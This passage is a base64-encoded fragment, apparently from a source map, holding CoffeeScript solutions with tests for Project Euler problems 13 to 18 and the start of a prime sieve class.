4MjJcbiAgOTU1NDgyNTUzMDAyNjM1MjA3ODE1MzIyOTY3OTYyNDk0ODE2NDE5NTM4NjgyMTg3NzRcbiAgNzYwODUzMjcxMzIyODU3MjMxMTA0MjQ4MDM0NTYxMjQ4Njc2OTcwNjQ1MDc5OTUyMzZcbiAgMzc3NzQyNDI1MzU0MTEyOTE2ODQyNzY4NjU1Mzg5MjYyMDUwMjQ5MTAzMjY1NzI5NjdcbiAgMjM3MDE5MTMyNzU3MjU2NzUyODU2NTMyNDgyNTgyNjU0NjMwOTIyMDcwNTg1OTY1MjJcbiAgMjk3OTg4NjAyNzIyNTgzMzE5MTMxMjYzNzUxNDczNDE5OTQ4ODk1MzQ3NjU3NDU1MDFcbiAgMTg0OTU3MDE0NTQ4NzkyODg5ODQ4NTY4Mjc3MjYwNzc3MTM3MjE0MDM3OTg4Nzk3MTVcbiAgMzgyOTgyMDM3ODMwMzE0NzM1Mjc3MjE1ODAzNDgxNDQ1MTM0OTEzNzMyMjY2NTEzODFcbiAgMzQ4Mjk1NDM4MjkxOTk5MTgxODAyNzg5MTY1MjI0MzEwMjczOTIyNTExMjI4Njk1MzlcbiAgNDA5NTc5NTMwNjY0MDUyMzI2MzI1MzgwNDQxMDAwNTk2NTQ5MzkxNTk4Nzk1OTM2MzVcbiAgMjk3NDYxNTIxODU1MDIzNzEzMDc2NDIyNTUxMjExODM2OTM4MDM1ODAzODg1ODQ5MDNcbiAgNDE2OTgxMTYyMjIwNzI5NzcxODYxNTgyMzY2Nzg0MjQ2ODkxNTc5OTM1MzI5NjE5MjJcbiAgNjI0Njc5NTcxOTQ0MDEyNjkwNDM4NzcxMDcyNzUwNDgxMDIzOTA4OTU1MjM1OTc0NTdcbiAgMjMxODk3MDY3NzI1NDc5MTUwNjE1MDU1MDQ5NTM5MjI5Nzk1MzA5MDExMjk5Njc1MTlcbiAgODYxODgwODgyMjU4NzUzMTQ1Mjk1ODQwOTkyNTEyMDM4MjkwMDk0MDc3NzA3NzU2NzJcbiAgMTEzMDY3Mzk3MDgzMDQ3MjQ0ODM4MTY1MzM4NzM1MDIzNDA4NDU2NDcwNTgwNzczMDhcbiAgODI5NTkxNzQ3NjcxNDAzNjMxOTgwMDgxODcxMjkwMTE4NzU0OTEzMTA1NDcxMjY1ODFcbiAgOTc2MjMzMzEwNDQ4MTgzODYyNjk1MTU0NTYzMzQ5MjYzNjY1NzI4OTc1NjM0MDA1MDBcbiAgNDI4NDYyODAxODM1MTcwNzA1Mjc4MzE4Mzk0MjU4ODIxNDU1MjEyMjcyNTEyNTAzMjdcbiAgNTUxMjE2MDM1NDY5ODEyMDA1ODE3NjIxNjUyMTI4Mjc2NTI3NTE2OTEyOTY4OTc3ODlcbiAgMzIyMzgxOTU3MzQzMjkzMzk5NDY0Mzc1MDE5MDc4MzY5NDU3NjU4ODMzNTIzOTk4ODZcbiAgNzU1MDYxNjQ5NjUxODQ3NzUxODA3MzgxNjg4Mzc4NjEwOTE1MjczNTc5Mjk3MDEzMzdcbiAgNjIxNzc4NDI3NTIxOTI2MjM0MDE5NDIzOTk2MzkxNjgwNDQ5ODM5OTMxNzMzMTI3MzFcbiAgMzI5MjQxODU3MDcxNDczNDk1NjY5MTY2NzQ2ODc2MzQ2NjA5MTUwMzU5MTQ2Nzc1MDRcbiAgOTk1MTg2NzE0MzAyMzUyMTk2Mjg4OTQ4OTAxMDI0MjMzMjUxMTY5MTM2MTk2MjY2MjJcbiAgNzMyNjc0NjA4MDA1OTE1NDc0NzE4MzA3OTgzOTI4Njg1MzUyMDY5NDY5NDQ1NDA3MjRcbiAgNzY4NDE4MjI1MjQ2NzQ0MTcxNjE1MTQwMzY0Mjc5ODIyNzMzNDgwNTU1NTYyMTQ4MThcbiAgOTcxNDI2MTc5MTAzNDI1OTg2NDcyMDQ1MTY4OTM5ODk0MjIxNzk4MjYwODgwNzY4NTJcbiAgODc3ODM2NDYxODI3OTkzNDYzMTM3Njc3NTQzMDc4MDkzNjMzMzMwMTg5ODI2NDIwOTBcbiAgMTA4NDg4MDI1MjE2NzQ2NzA4ODMyMTUxMjAxODU4ODM1NDMyMjM4MTI4NzY5NTI3ODZcbiAgNzEzMjk2MTI0NzQ3ODI0NjQ1Mzg2MzY5OTMwMDkwNDkzMTAzNjM2MTk3NjM4NzgwMzlcbiAgNjIxODQwNzM1NzIzOTk3OTQyMjM0MDYyMzUzOTM4MDgzMzk2NTEzMjc0MDgwMTExMTZcbiAgNjY2Mjc4OTE5ODE0ODgwODc3OTc5NDE4NzY4NzYxNDQyMzAwMzA5ODQ0OTA4NTE0MTFcbiAgNjA2NjE4MjYyOTM2ODI4MzY3NjQ3NDQ3NzkyMzkxODAzMzUxMTA5ODkwNjk3OTA3MTRcbiAgODU3ODY5NDQwODk1NTI5OTA2NTM2NDA0NDc0MjU1NzYwODM2NTk5NzY2NDU3OTUwOTZcbiAgNjYwMjQzOTY0MDk5MDUzODk2MDcxMjAxOTgyMTk5NzYwNDc1OTk0OTAxOTcyMzAyOTdcbiAgNjQ5MTM5ODI2ODAwMzI5NzMxNTYwMzcxMjAwNDEzNzc5MDM3ODU1NjYwODUwODkyNTJcbiAgMTY3MzA5MzkzMTk4NzI3NTAyNzU0Njg5MDY5MDM3MDc1Mzk0MTMwNDI2NTIzMTUwMTFcbiAgOTQ4MDkzNzcyNDUwNDg3OTUxNTA5NTQxMDA5MjE2NDU4NjM3NTQ3MTA1OTg0MzY3OTFcbiAgNzg2MzkxNjcwMjExODc0OTI0MzE5OTU3MDA2NDE5MTc5Njk3Nzc1OTkwMjgzMDA2OTlcbiAgMTUzNjg3MTM3MTE5MzY2MTQ5NTI4MTEzMDU4NzYzODAyNzg0MTA3NTQ0NDk3MzMwNzhcbiAgNDA3ODk5MjMxMTU1MzU1NjI1NjExNDIzMjI0MjMyNTUwMzM2ODU0NDI0ODg5MTczNTNcbiAgNDQ4ODk5MTE1MDE0NDA2NDgwMjAzNjkwNjgwNjM5NjA2NzIzMjIxOTMyMDQxNDk1MzVcbiAgNDE1MDMxMjg4ODAzMzk1MzYwNTMyOTkzNDAzNjgwMDY5Nzc3MTA2NTA1NjY2MzE5NTRcbiAgODEyMzQ4ODA2NzMyMTAxNDY3MzkwNTg1Njg1NTc5MzQ1ODE0MDM2Mjc4MjI3MDMyODBcbiAgODI2MTY1NzA3NzM5NDgzMjc1OTIyMzI4NDU5NDE3MDY1MjUwOTQ1MTIzMjUyMzA2MDhcbiAgMjI5MTg4MDIwNTg3NzczMTk3MTk4Mzk0NTAxODA4ODgwNzI0Mjk2NjE5ODA4MTExOTdcbiAgNzcxNTg1NDI1MDIwMTY1NDUwOTA0MTMyNDU4MDk3ODY4ODI3Nzg5NDg3MjE4NTk2MTdcbiAgNzIxMDc4Mzg0MzUwNjkxODYxNTU0MzU2NjI4ODQwNjIyNTc0NzM2OTIyODQ1MDk1MTZcbiAgMjA4NDk2MDM5ODAxMzQwMDE3MjM5MzA2NzE2NjY4MjM1NTUyNDUyNTI4MDQ2MDk3MjJcbiAgNTM1MDM1MzQyMjY0NzI1MjQyNTA4NzQwNTQwNzU1OTE3ODk3ODEyNjQzMzAzMzE2OTBcbl1cblxucHJvYmxlbS5hbnN3ZXIgPSAtPlxuICBzdW0gPSAwXG4gIGZvciBuIGluIG51bWJlcnNcbiAgICBzdW0gKz0gblxuXG4gIHN0ciA9IFN0cmluZyhzdW0pLnJlcGxhY2UoL1xcLi9nLCBcIlwiKS5zdWJzdHIoMCwgMTApXG4gIHJldHVybiBzdHJcbiIsIm1vZHVsZS5leHBvcnRzID0gcHJvYmxlbSA9IG5ldyBQcm9ibGVtIFwiXCJcIlxuXG5Qcm9ibGVtIDE0OiBMb25nZXN0IENvbGxhdHogc2VxdWVuY2Vcbi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLVxuXG5UaGUgZm9sbG93aW5nIGl0ZXJhdGl2ZSBzZXF1ZW5jZSBpcyBkZWZpbmVkIGZvciB0aGUgc2V0IG9mIHBvc2l0aXZlIGludGVnZXJzOlxuXG4gICAgbiAtPiBuLzIgICAgKG4gaXMgZXZlbilcbiAgICBuIC0+IDNuICsgMSAobiBpcyBvZGQpXG5cblVzaW5nIHRoZSBydWxlIGFib3ZlIGFuZCBzdGFydGluZyB3aXRoIDEzLCB3ZSBnZW5lcmF0ZSB0aGUgZm9sbG93aW5nIHNlcXVlbmNlOlxuXG4gICAgMTMgLT4gNDAgLT4gMjAgLT4gMTAgLT4gNSAtPiAxNiAtPiA4IC0+IDQgLT4gMiAtPiAxXG5cbkl0IGNhbiBiZSBzZWVuIHRoYXQgdGhpcyBzZXF1ZW5jZSAoc3RhcnRpbmcgYXQgMTMgYW5kIGZpbmlzaGluZyBhdCAxKSBjb250YWlucyAxMCB0ZXJtcy4gQWx0aG91Z2ggaXQgaGFzIG5vdCBiZWVuIHByb3ZlZCB5ZXQgKENvbGxhdHogUHJvYmxlbSksIGl0IGlzIHRob3VnaHQgdGhhdCBhbGwgc3RhcnRpbmcgbnVtYmVycyBmaW5pc2ggYXQgMS5cblxuV2hpY2ggc3RhcnRpbmcgbnVtYmVyLCB1bmRlciBvbmUgbWlsbGlvbiwgcHJvZHVjZXMgdGhlIGxvbmdlc3QgY2hhaW4/XG5cbk5PVEU6IE9uY2UgdGhlIGNoYWluIHN0YXJ0cyB0aGUgdGVybXMgYXJlIGFsbG93ZWQgdG8gZ28gYWJvdmUgb25lIG1pbGxpb24uXG5cblwiXCJcIlxuXG5jb2xsYXR6Q2FjaGUgPSB7fVxuXG5jb2xsYXR6Q2hhaW5MZW5ndGggPSAoc3RhcnRpbmdWYWx1ZSkgLT5cbiAgbiA9IHN0YXJ0aW5nVmFsdWVcbiAgdG9CZUNhY2hlZCA9IFtdXG5cbiAgbG9vcFxuICAgIGJyZWFrIGlmIGNvbGxhdHpDYWNoZS5oYXNPd25Qcm9wZXJ0eShuKVxuXG4gICAgIyByZW1lbWJlciB0aGF0IHdlIGZhaWxlZCB0byBjYWNoZSB0aGlzIGVudHJ5XG4gICAgdG9CZUNhY2hlZC5wdXNoKG4pXG5cbiAgICBpZiBuID09IDFcbiAgICAgIGJyZWFrXG5cbiAgICBpZiAobiAlIDIpID09IDBcbiAgICAgIG4gPSBNYXRoLmZsb29yKG4gLyAyKVxuICAgIGVsc2VcbiAgICAgIG4gPSAobiAqIDMpICsgMVxuXG4gICMgU2luY2Ugd2UgbGVmdCBicmVhZGNydW1icyBkb3duIHRoZSB0cmFpbCBvZiB0aGluZ3Mgd2UgaGF2ZW4ndCBjYWNoZWRcbiAgIyB3YWxrIGJhY2sgZG93biB0aGUgdHJhaWwgYW5kIGNhY2hlIGFsbCB0aGUgZW50cmllcyBmb3VuZCBhbG9uZyB0aGUgd2F5XG4gIGxlbiA9IHRvQmVDYWNoZWQubGVuZ3RoXG4gIGZvciB2LGkgaW4gdG9CZUNhY2hlZFxuICAgIGNvbGxhdHpDYWNoZVt2XSA9IGNvbGxhdHpDYWNoZVtuXSArIChsZW4gLSBpKVxuXG4gIHJldHVybiBjb2xsYXR6Q2FjaGVbc3RhcnRpbmdWYWx1ZV1cblxucHJvYmxlbS50ZXN0ID0gLT5cbiAgY29sbGF0ekNhY2hlID0geyBcIjFcIjogMSB9XG4gIGVxdWFsKGNvbGxhdHpDaGFpbkxlbmd0aCgxMyksIDEwLCBcIjEzIGhhcyBhIGNvbGxhdHogY2hhaW4gb2YgMTBcIilcbiAgZXF1YWwoY29sbGF0ekNoYWluTGVuZ3RoKDI2KSwgMTEsIFwiMjYgaGFzIGEgY29sbGF0eiBjaGFpbiBvZiAxMVwiKVxuICBlcXVhbChjb2xsYXR6Q2hhaW5MZW5ndGgoIDEpLCAgMSwgXCIxIGhhcyBhIGNvbGxhdHogY2hhaW4gb2YgMVwiKVxuXG5wcm9ibGVtLmFuc3dlciA9IC0+XG4gIGNvbGxhdHpDYWNoZSA9IHsgXCIxXCI6IDEgfVxuXG4gIG1heENoYWluID0gMFxuICBtYXhDaGFpbkxlbmd0aCA9IDBcbiAgZm9yIGkgaW4gWzEuLi4xMDAwMDAwXVxuICAgIGNoYWluTGVuZ3RoID0gY29sbGF0ekNoYWluTGVuZ3RoKGkpXG4gICAgaWYgbWF4Q2hhaW5MZW5ndGggPCBjaGFpbkxlbmd0aFxuICAgICAgbWF4Q2hhaW5MZW5ndGggPSBjaGFpbkxlbmd0aFxuICAgICAgbWF4Q2hhaW4gPSBpXG5cbiAgcmV0dXJuIHsgYW5zd2VyOiBtYXhDaGFpbiwgY2hhaW5MZW5ndGg6IG1heENoYWluTGVuZ3RoIH1cbiIsIm1vZHVsZS5leHBvcnRzID0gcHJvYmxlbSA9IG5ldyBQcm9ibGVtIFwiXCJcIlxuXG5Qcm9ibGVtIDE1OiBMYXR0aWNlIHBhdGhzXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cblN0YXJ0aW5nIGluIHRoZSB0b3AgbGVmdCBjb3JuZXIgb2YgYSAyw5cyIGdyaWQsIGFuZCBvbmx5IGJlaW5nIGFibGUgdG8gbW92ZSB0byB0aGUgcmlnaHQgYW5kIGRvd24sIHRoZXJlIGFyZSBleGFjdGx5IDYgcm91dGVzIHRvIHRoZSBib3R0b20gcmlnaHQgY29ybmVyLlxuXG4gICAgKHBpY3R1cmUgc2hvd2luZyA2IHBhdGhzOiBSUkRELCBSRFJELCBSRERSLCBEUlJELCBEUkRSLCBERFJSKVxuXG5Ib3cgbWFueSBzdWNoIHJvdXRlcyBhcmUgdGhlcmUgdGhyb3VnaCBhIDIww5cyMCBncmlkP1xuXG5cIlwiXCJcblxubWF0aCA9IHJlcXVpcmUgXCJtYXRoXCJcblxubGF0dGljZSA9IChuKSAtPlxuICByZXR1cm4gbWF0aC5uQ3IobiAqIDIsIG4pXG5cbnByb2JsZW0udGVzdCA9IC0+XG4gIGVxdWFsKGxhdHRpY2UoMSksIDIsIFwiMXgxIGxhdHRpY2UgaGFzIDIgcGF0aHNcIilcbiAgZXF1YWwobGF0dGljZSgyKSwgNiwgXCIyeDIgbGF0dGljZSBoYXMgNiBwYXRoc1wiKVxuXG5wcm9ibGVtLmFuc3dlciA9IC0+XG4gIHJldHVybiBsYXR0aWNlKDIwKVxuIiwibW9kdWxlLmV4cG9ydHMgPSBwcm9ibGVtID0gbmV3IFByb2JsZW0gXCJcIlwiXG5cblByb2JsZW0gMTY6IFBvd2VyIGRpZ2l0IHN1bVxuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tXG5cbjJeMTUgPSAzMjc2OCBhbmQgdGhlIHN1bSBvZiBpdHMgZGlnaXRzIGlzIDMgKyAyICsgNyArIDYgKyA4ID0gMjYuXG5cbldoYXQgaXMgdGhlIHN1bSBvZiB0aGUgZGlnaXRzIG9mIHRoZSBudW1iZXIgMl4xMDAwP1xuXG5cIlwiXCJcblxubWF0aCA9IHJlcXVpcmUgXCJtYXRoXCJcbmJpZ0ludCA9IHJlcXVpcmUgXCJiaWctaW50ZWdlclwiXG5cbk1BWF9FWFBPTkVOVCA9IDUwXG5cbnBvd2VyRGlnaXRTdW0gPSAoeCwgeSkgLT5cbiAgbnVtYmVyID0gYmlnSW50KDEpXG4gIHdoaWxlIHkgIT0gMFxuICAgIGV4cG9uZW50ID0geVxuICAgIGlmIGV4cG9uZW50ID4gTUFYX0VYUE9ORU5UXG4gICAgICBleHBvbmVudCA9IE1BWF9FWFBPTkVOVFxuICAgIHkgLT0gZXhwb25lbnRcbiAgICBudW1iZXIgPSBudW1iZXIubXVsdGlwbHkgTWF0aC5mbG9vcihNYXRoLnBvdyh4LCBleHBvbmVudCkpXG4gIGRpZ2l0cyA9IFN0cmluZyhudW1iZXIpXG5cbiAgc3VtID0gMFxuICBmb3IgZCBpbiBkaWdpdHNcbiAgICBzdW0gKz0gcGFyc2VJbnQoZClcbiAgcmV0dXJuIHN1bVxuXG5wcm9ibGVtLnRlc3QgPSAtPlxuICBlcXVhbChwb3dlckRpZ2l0U3VtKDIsIDE1KSwgMjYsIFwic3VtIG9mIGRpZ2l0cyBvZiAyXjE1IGlzIDI2XCIpXG5cbnByb2JsZW0uYW5zd2VyID0gLT5cbiAgcmV0dXJuIHBvd2VyRGlnaXRTdW0oMiwgMTAwMClcbiIsIm1vZHVsZS5leHBvcnRzID0gcHJvYmxlbSA9IG5ldyBQcm9ibGVtIFwiXCJcIlxuXG5Qcm9ibGVtIDE3OiBOdW1iZXIgbGV0dGVyIGNvdW50c1xuLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuSWYgdGhlIG51bWJlcnMgMSB0byA1IGFyZSB3cml0dGVuIG91dCBpbiB3b3Jkczogb25lLCB0d28sIHRocmVlLCBmb3VyLCBmaXZlLCB0aGVuIHRoZXJlIGFyZSAzICsgMyArIDUgKyA0ICsgNCA9IDE5IGxldHRlcnMgdXNlZCBpbiB0b3RhbC5cblxuSWYgYWxsIHRoZSBudW1iZXJzIGZyb20gMSB0byAxMDAwIChvbmUgdGhvdXNhbmQpIGluY2x1c2l2ZSB3ZXJlIHdyaXR0ZW4gb3V0IGluIHdvcmRzLCBob3cgbWFueSBsZXR0ZXJzIHdvdWxkIGJlIHVzZWQ/XG5cbk5PVEU6IERvIG5vdCBjb3VudCBzcGFjZXMgb3IgaHlwaGVucy4gRm9yIGV4YW1wbGUsIDM0MiAodGhyZWUgaHVuZHJlZCBhbmQgZm9ydHktdHdvKSBjb250YWlucyAyMyBsZXR0ZXJzIGFuZCAxMTUgKG9uZSBodW5kcmVkIGFuZCBmaWZ0ZWVuKSBjb250YWlucyAyMCBsZXR0ZXJzLiBUaGUgdXNlIG9mIFwiYW5kXCIgd2hlbiB3cml0aW5nIG91dCBudW1iZXJzIGlzIGluIGNvbXBsaWFuY2Ugd2l0aCBCcml0aXNoIHVzYWdlLlxuXG5cIlwiXCJcblxubmFtZXMgPVxuICBvbmVzOiBcInplcm8gb25lIHR3byB0aHJlZSBmb3VyIGZpdmUgc2l4IHNldmVuIGVpZ2h0IG5pbmUgdGVuIGVsZXZlbiB0d2VsdmUgdGhpcnRlZW4gZm91cnRlZW4gZmlmdGVlbiBzaXh0ZWVuIHNldmVudGVlbiBlaWdodGVlbiBuaW5ldGVlblwiLnNwbGl0KC9cXHMrLylcbiAgdGVuczogXCJfIF8gdHdlbnR5IHRoaXJ0eSBmb3J0eSBmaWZ0eSBzaXh0eSBzZXZlbnR5IGVpZ2h0eSBuaW5ldHlcIi5zcGxpdCgvXFxzKy8pXG5cbiMgc3VwcG9ydHMgMC05OTk5XG5udW1iZXJMZXR0ZXJDb3VudCA9IChudW0pIC0+XG4gIG4gPSBudW1cbiAgbmFtZSA9IFwiXCJcblxuICBpZiBuID49IDEwMDBcbiAgICB0aG91c2FuZHMgPSBNYXRoLmZsb29yKG4gLyAxMDAwKVxuICAgIG4gPSBuICUgMTAwMFxuICAgIG5hbWUgKz0gXCIje25hbWVzLm9uZXNbdGhvdXNhbmRzXX0gdGhvdXNhbmQgXCJcblxuICBpZiBuID49IDEwMFxuICAgIGh1bmRyZWRzID0gTWF0aC5mbG9vcihuIC8gMTAwKVxuICAgIG4gPSBuICUgMTAwXG4gICAgbmFtZSArPSBcIiN7bmFtZXMub25lc1todW5kcmVkc119IGh1bmRyZWQgXCJcblxuICBpZiAobiA+IDApIGFuZCAobmFtZS5sZW5ndGggPiAwKVxuICAgIG5hbWUgKz0gXCJhbmQgXCJcblxuICBpZiBuID49IDIwXG4gICAgdGVucyA9IE1hdGguZmxvb3IobiAvIDEwKVxuICAgIG4gPSBuICUgMTBcbiAgICBuYW1lICs9IFwiI3tuYW1lcy50ZW5zW3RlbnNdfSBcIlxuXG4gIGlmIG4gPiAwXG4gICAgbmFtZSArPSBcIiN7bmFtZXMub25lc1tuXX0gXCJcblxuICBsZXR0ZXJzT25seSA9IG5hbWUucmVwbGFjZSgvW15hLXpdL2csIFwiXCIpXG4gICMgY29uc29sZS5sb2cgXCJudW06ICN7bnVtfSwgbmFtZTogI3tuYW1lfSwgbGV0dGVyc09ubHk6ICN7bGV0dGVyc09ubHl9XCJcbiAgcmV0dXJuIGxldHRlcnNPbmx5Lmxlbmd0aFxuXG5udW1iZXJMZXR0ZXJDb3VudFJhbmdlID0gKGEsIGIpIC0+XG4gIHN1bSA9IDBcbiAgZm9yIGkgaW4gW2EuLmJdXG4gICAgc3VtICs9IG51bWJlckxldHRlckNvdW50KGkpXG4gIHJldHVybiBzdW1cblxucHJvYmxlbS50ZXN0ID0gLT5cbiAgZXF1YWwobnVtYmVyTGV0dGVyQ291bnRSYW5nZSgxLCA1KSwgMTksIFwic3VtIG9mIGxlbmd0aHMgb2YgbnVtYmVycyAxLTUgaXMgMTlcIilcbiAgZXF1YWwobnVtYmVyTGV0dGVyQ291bnQoMzQyKSwgMjMsIFwibGVuZ3RoIG9mIG5hbWUgb2YgMzQyIGlzIDIzXCIpXG4gIGVxdWFsKG51bWJlckxldHRlckNvdW50KDExNSksIDIwLCBcImxlbmd0aCBvZiBuYW1lIG9mIDExNSBpcyAyMFwiKVxuXG5wcm9ibGVtLmFuc3dlciA9IC0+XG4gIHJldHVybiBudW1iZXJMZXR0ZXJDb3VudFJhbmdlKDEsIDEwMDApXG4iLCJtb2R1bGUuZXhwb3J0cyA9IHByb2JsZW0gPSBuZXcgUHJvYmxlbSBcIlwiXCJcblxuUHJvYmxlbSAxODogTWF4aW11bSBwYXRoIHN1bSBJXG4tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS1cblxuQnkgc3RhcnRpbmcgYXQgdGhlIHRvcCBvZiB0aGUgdHJpYW5nbGUgYmVsb3cgYW5kIG1vdmluZyB0byBhZGphY2VudCBudW1iZXJzIG9uIHRoZSByb3cgYmVsb3csIHRoZSBtYXhpbXVtIHRvdGFsIGZyb20gdG9wIHRvIGJvdHRvbSBpcyAyMy5cblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgM1xuICAgICAgICAgICAgICAgICAgICAgICAgICAgICA3IDRcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAyIDQgNlxuICAgICAgICAgICAgICAgICAgICAgICAgICAgOCA1IDkgM1xuXG5UaGF0IGlzLCAzICsgNyArIDQgKyA5ID0gMjMuXG5cbkZpbmQgdGhlIG1heGltdW0gdG90YWwgZnJvbSB0b3AgdG8gYm90dG9tIG9mIHRoZSB0cmlhbmdsZSBiZWxvdzpcblxuICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgNzVcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICA5NSAgNjRcbiAgICAgICAgICAgICAgICAgICAgICAgICAgMTcgIDQ3ICA4MlxuICAgICAgICAgICAgICAgICAgICAgICAgMTggIDM1ICA4NyAgMTBcbiAgICAgICAgICAgICAgICAgICAgICAyMCAgMDQgIDgyICA0NyAgNjVcbiAgICAgICAgICAgICAgICAgICAgMTkgIDAxICAyMyAgNzUgIDAzICAzNFxuICAgICAgICAgICAgICAgICAgODggIDAyICA3NyAgNzMgIDA3ICA2MyAgNjdcbiAgICAgICAgICAgICAgICA5OSAgNjUgIDA0ICAyOCAgMDYgIDE2ICA3MCAgOTJcbiAgICAgICAgICAgICAgNDEgIDQxICAyNiAgNTYgIDgzICA0MCAgODAgIDcwICAzM1xuICAgICAgICAgICAgNDEgIDQ4ICA3MiAgMzMgIDQ3ICAzMiAgMzcgIDE2ICA5NCAgMjlcbiAgICAgICAgICA1MyAgNzEgIDQ0ICA2NSAgMjUgIDQzICA5MSAgNTIgIDk3ICA1MSAgMTRcbiAgICAgICAgNzAgIDExICAzMyAgMjggIDc3ICA3MyAgMTcgIDc4ICAzOSAgNjggIDE3ICA1N1xuICAgICAgOTEgIDcxICA1MiAgMzggIDE3ICAxNCAgOTEgIDQzICA1OCAgNTAgIDI3ICAyOSAgNDhcbiAgICA2MyAgNjYgIDA0ICA2OCAgODkgIDUzICA2NyAgMzAgIDczICAxNiAgNjkgIDg3ICA0MCAgMzFcbiAgMDQgIDYyICA5OCAgMjcgIDIzICAwOSAgNzAgIDk4ICA3MyAgOTMgIDM4ICA1MyAgNjAgIDA0ICAyM1xuXG5OT1RFOiBBcyB0aGVyZSBhcmUgb25seSAxNjM4NCByb3V0ZXMsIGl0IGlzIHBvc3NpYmxlIHRvIHNvbHZlIHRoaXMgcHJvYmxlbSBieSB0cnlpbmcgZXZlcnkgcm91dGUuIEhvd2V2ZXIsIFByb2JsZW0gNjcsIGlzIHRoZSBzYW1lIGNoYWxsZW5nZSB3aXRoIGEgdHJpYW5nbGUgY29udGFpbmluZyBvbmUtaHVuZHJlZCByb3dzOyBpdCBjYW5ub3QgYmUgc29sdmVkIGJ5IGJydXRlIGZvcmNlLCBhbmQgcmVxdWlyZXMgYSBjbGV2ZXIgbWV0aG9kISA7bylcblxuXCJcIlwiXG5cbm1hdGggPSByZXF1aXJlIFwibWF0aFwiXG5cbnRlc3RQeXJhbWlkID0gXCJcIlwiXG4gICAgICAzXG4gICAgIDcgNFxuICAgIDIgNCA2XG4gICA4IDUgOSAzXG5cIlwiXCJcblxubWFpblB5cmFtaWQgPSBcIlwiXCJcbiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIDc1XG4gICAgICAgICAgICAgICAgICAgICAgICAgICAgOTUgIDY0XG4gICAgICAgICAgICAgICAgICAgICAgICAgIDE3ICA0NyAgODJcbiAgICAgICAgICAgICAgICAgICAgICAgIDE4ICAzNSAgODcgIDEwXG4gICAgICAgICAgICAgICAgICAgICAgMjAgIDA0ICA4MiAgNDcgIDY1XG4gICAgICAgICAgICAgICAgICAgIDE5ICAwMSAgMjMgIDc1ICAwMyAgMzRcbiAgICAgICAgICAgICAgICAgIDg4ICAwMiAgNzcgIDczICAwNyAgNjMgIDY3XG4gICAgICAgICAgICAgICAgOTkgIDY1ICAwNCAgMjggIDA2ICAxNiAgNzAgIDkyXG4gICAgICAgICAgICAgIDQxICA0MSAgMjYgIDU2ICA4MyAgNDAgIDgwICA3MCAgMzNcbiAgICAgICAgICAgIDQxICA0OCAgNzIgIDMzICA0NyAgMzIgIDM3ICAxNiAgOTQgIDI5XG4gICAgICAgICAgNTMgIDcxICA0NCAgNjUgIDI1ICA0MyAgOTEgIDUyICA5NyAgNTEgIDE0XG4gICAgICAgIDcwICAxMSAgMzMgIDI4ICA3NyAgNzMgIDE3ICA3OCAgMzkgIDY4ICAxNyAgNTdcbiAgICAgIDkxICA3MSAgNTIgIDM4ICAxNyAgMTQgIDkxICA0MyAgNTggIDUwICAyNyAgMjkgIDQ4XG4gICAgNjMgIDY2ICAwNCAgNjggIDg5ICA1MyAgNjcgIDMwICA3MyAgMTYgIDY5ICA4NyAgNDAgIDMxXG4gIDA0ICA2MiAgOTggIDI3ICAyMyAgMDkgIDcwICA5OCAgNzMgIDkzICAzOCAgNTMgIDYwICAwNCAgMjNcblxuXCJcIlwiXG5cbnN0cmluZ1RvUHlyYW1pZCA9IChzdHIpIC0+XG4gIGRpZ2l0cyA9IChwYXJzZUludChkKSBmb3IgZCBpbiBTdHJpbmcoc3RyKS5yZXBsYWNlKC9cXG4vZywgXCIgXCIpLnNwbGl0KC9cXHMrLykuZmlsdGVyIChzKSAtPiByZXR1cm4gKHMubGVuZ3RoID4gMCkgKVxuICBncmlkID0gW11cbiAgcm93ID0gMFxuICB3aGlsZSBkaWdpdHMubGVuZ3RoXG4gICAgbGVuID0gcm93ICsgMVxuICAgIGEgPSBBcnJheShsZW4pXG4gICAgZm9yIGkgaW4gWzAuLi5sZW5dXG4gICAgICBhW2ldID0gZGlnaXRzLnNoaWZ0KClcbiAgICBncmlkW3Jvd10gPSBhXG4gICAgcm93KytcbiAgcmV0dXJuIGdyaWRcblxuIyBDcnVzaGVzIHRoZSBweXJhbWlkIGZyb20gYm90dG9tIHVwLiBXaGVuIGl0IGlzIGFsbCBkb25lIGNydXNoaW5nLCB0aGUgdG9wIG9mIHRoZSBweXJhbWlkIGlzIHRoZSBhbnN3ZXIuXG5tYXhpbXVtUGF0aFN1bSA9IChweXJhbWlkU3RyaW5nKSAtPlxuICBweXJhbWlkID0gc3RyaW5nVG9QeXJhbWlkKHB5cmFtaWRTdHJpbmcpXG4gIHN1bSA9IDBcbiAgcm93ID0gcHlyYW1pZC5sZW5ndGggLSAyXG4gIHdoaWxlIHJvdyA+PSAwXG4gICAgZm9yIGkgaW4gWzAuLnJvd11cbiAgICAgIG1heEJlbG93ID0gTWF0aC5tYXgocHlyYW1pZFtyb3crMV1baV0sIHB5cmFtaWRbcm93KzFdW2krMV0pXG4gICAgICBweXJhbWlkW3Jvd11baV0gKz0gbWF4QmVsb3dcbiAgICByb3ctLVxuICByZXR1cm4gcHlyYW1pZFswXVswXVxuXG5wcm9ibGVtLnRlc3QgPSAtPlxuICBlcXVhbChtYXhpbXVtUGF0aFN1bSh0ZXN0UHlyYW1pZCksIDIzLCBcIm1heGltdW0gcGF0aCBzdW0gb2YgdGVzdCB0cmlhbmdsZSBpcyAyM1wiKVxuXG5wcm9ibGVtLmFuc3dlciA9IC0+XG4gIGNvbnNvbGUubG9nIHdpbmRvdy5hcmdzXG4gIHJldHVybiBtYXhpbXVtUGF0aFN1bShtYWluUHlyYW1pZClcbiIsInJvb3QgPSBleHBvcnRzID8gdGhpc1xuXG4jIFNpZXZlIHdhcyBibGluZGx5IHRha2VuL2FkYXB0ZWQgZnJvbSBSb3NldHRhQ29kZS4gRE9OVCBFVkVOIENBUkVcbmNsYXNzIEluY3JlbWVudGFsU2lldmVcbiAgY29uc3RydWN0b3I6IC0+XG4gICAgQG4gPSAwXG5cbiAgbmV4dDogLT5cbiAgICBAb